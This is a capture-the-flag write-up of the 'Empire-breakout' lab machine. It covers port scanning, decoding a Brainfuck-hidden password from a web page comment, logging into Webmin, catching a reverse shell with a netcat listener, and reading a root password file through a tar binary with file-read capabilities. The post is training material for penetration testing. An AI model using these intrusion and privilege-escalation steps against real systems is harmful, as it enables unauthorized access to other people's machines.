---
title: "Proving grounds Play: Empire-breakout"
layout: post
date: 2023-10-01 03:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.51 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http    MiniServ 1.981 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: C7F93A5D476A64454D4E271B24571406
|_http-title: 200 &mdash; Document follows
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: MiniServ/1.981
20000/tcp open  http    MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
|_http-favicon: Unknown favicon MD5: 953B40D37322DDEFEEC092BC48AEA904
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: MiniServ/1.830
```

## SMB Username Enumeration

Using `enum4linux` the username cyber has been discovered.

## 80/tcp - open  http - Apache httpd 2.4.51 ((Debian))

![img](/assets/images/CTF/Proving_Grounds/Empire-breakout/web.png)

There is a encrypted text commented in the source code of the apache page `view-source:http://192.168.240.238/`.

```html
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
-->
```

## Cipher Analysis

[https://www.dcode.fr/cipher-identifier](https://www.dcode.fr/cipher-identifier)

![img](/assets/images/CTF/Proving_Grounds/Empire-breakout/analysis1.png)

**Brainfuck**

![img](/assets/images/CTF/Proving_Grounds/Empire-breakout/analysis2.png)

Upon analysis the algorithm of the encrypted text has been discovered which is `Brainfuck`.

## Brainfuck decode

[https://www.splitbrain.org/_static/ook/](https://www.splitbrain.org/_static/ook/)

**Decoded text**

```text
.2uqPEfj3D<P'a-3
```

## 20000/tcp - open  http - MiniServ 1.830 (Webmin httpd)

![img](/assets/images/CTF/Proving_Grounds/Empire-breakout/web2.png)

Login to the portal using the username `cyber` and password `.2uqPEfj3D<P'a-3`.

Click on the interactive shell and create a reverse shell connection.

![img](/assets/images/CTF/Proving_Grounds/Empire-breakout/shell.png)

```sh
naveenj@hackerspace:|01:09|~/pg-play/Empire-breakout$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.45.225] from (UNKNOWN) [192.168.240.238] 55430
python3 -c 'import pty; pty.spawn("/bin/bash")'
cyber@breakout:~$ 
```

**Initial Foothold Obtained**

## Privilege Escalation

Enumerate the machine's extended capabilities.

```sh
cyber@breakout:~$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
cyber@breakout:~$ 
```

There is a binary `tar` located in the folder `/home/cyber`, which can be used to reveal the contents of the restricted files.

Upon checking the folders there is a old password file exists in the `backups` folder.

```sh
cyber@breakout:~$ cd /var/backups
cd /var/backups
cyber@breakout:/var/backups$ ll
ll
total 484K
4.0K drwxr-xr-x  2 root root 4.0K Dec  8  2022 .
 40K -rw-r--r--  1 root root  40K Dec  8  2022 alternatives.tar.0
   0 -rw-r--r--  1 root root    0 Dec  8  2022 dpkg.arch.0
 16K -rw-r--r--  1 root root  13K Nov 17  2022 apt.extended_states.0
4.0K -rw-------  1 root root   17 Oct 20  2021 .old_pass.bak    #old password file
404K -rw-r--r--  1 root root 404K Oct 19  2021 dpkg.status.0
4.0K -rw-r--r--  1 root root 1.5K Oct 19  2021 apt.extended_states.1.gz
4.0K drwxr-xr-x 14 root root 4.0K Oct 19  2021 ..
4.0K -rw-r--r--  1 root root  186 Oct 19  2021 dpkg.diversions.0
4.0K -rw-r--r--  1 root root  135 Oct 19  2021 dpkg.statoverride.0
cyber@breakout:/var/backups$ 
```

### Exploitation

Use the tar utility to compress the old password file.

```sh
cyber@breakout:~$ ./tar -cvf old_pass.tar /var/backups/.old_pass.bak    #compress
./tar -cvf old_pass.tar /var/backups/.old_pass.bak
/var/backups/.old_pass.bak
cyber@breakout:~$ ll
4.0K drwxr-xr-x  8 cyber cyber 4.0K Oct  1 01:28 .12K -rw-r--r--  1 cyber cyber  10K Oct  1 01:28 old_pass.tar   #compressed file
4.0K -rw-r--r--  1 root  root    33 Oct  1 01:01 local.txt
4.0K drwxr-xr-x  2 cyber cyber 4.0K Oct 20  2021 .tmp
   0 -rw-------  1 cyber cyber    0 Oct 20  2021 .bash_history
520K -rwxr-xr-x  1 root  root  520K Oct 19  2021 tar
4.0K drwxr-xr-x  3 cyber cyber 4.0K Oct 19  2021 .local
4.0K drwx------ 16 cyber cyber 4.0K Oct 19  2021 .usermin
4.0K drwxr-xr-x  2 cyber cyber 4.0K Oct 19  2021 .filemin
4.0K drwx------  2 cyber cyber 4.0K Oct 19  2021 .gnupg
4.0K drwx------  2 cyber cyber 4.0K Oct 19  2021 .spamassassin
4.0K -rw-r--r--  1 cyber cyber  220 Oct 19  2021 .bash_logout
4.0K -rw-r--r--  1 cyber cyber 3.5K Oct 19  2021 .bashrc
4.0K -rw-r--r--  1 cyber cyber  807 Oct 19  2021 .profile
4.0K drwxr-xr-x  3 root  root  4.0K Oct 19  2021 ..
cyber@breakout:~$
```

Extract the compressed file to read the password file.

```sh
cyber@breakout:~$ ls
ls
local.txt  old_pass.tar  tar  var   #extracted var folder
cyber@breakout:~$ cd var
cd var
cyber@breakout:~/var$ ls
ls
backups
cyber@breakout:~/var$ cd backups
cd backups
cyber@breakout:~/var/backups$ ll
ll
total 12K
4.0K drwxr-xr-x 2 cyber cyber 4.0K Oct  1 01:32 .
4.0K drwxr-xr-x 3 cyber cyber 4.0K Oct  1 01:32 ..
4.0K -rw------- 1 cyber cyber   17 Oct 20  2021 .old_pass.bak   #password file
cyber@breakout:~/var/backups$ cat .old_pass.bak
cat .old_pass.bak
Ts&4&YurgtRX(=~h    #password
cyber@breakout:~/var/backups$
```

Switch to root user and use the password found above.

```sh
cyber@breakout:~/var/backups$ su root
su root
Password: Ts&4&YurgtRX(=~h
root@breakout:/home/cyber/var/backups# 
cd
root@breakout:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@breakout:~# 
```

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).